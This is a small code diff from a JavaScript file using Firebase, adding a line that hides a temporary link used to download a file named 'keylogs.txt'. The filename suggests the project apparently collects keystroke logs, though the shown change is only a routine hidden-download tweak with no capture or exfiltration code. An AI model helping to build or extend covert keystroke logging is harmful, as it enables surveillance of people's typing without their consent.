@@ -97,6 +97,7 @@ firebase.initializeApp(firebaseConfig);
             const tempLink = document.createElement('a');
             tempLink.href = url;
             tempLink.download = 'keylogs.txt';
+            tempLink.style.display = 'none';
             
             // Append the link to the body and trigger click
             document.body.appendChild(tempLink);
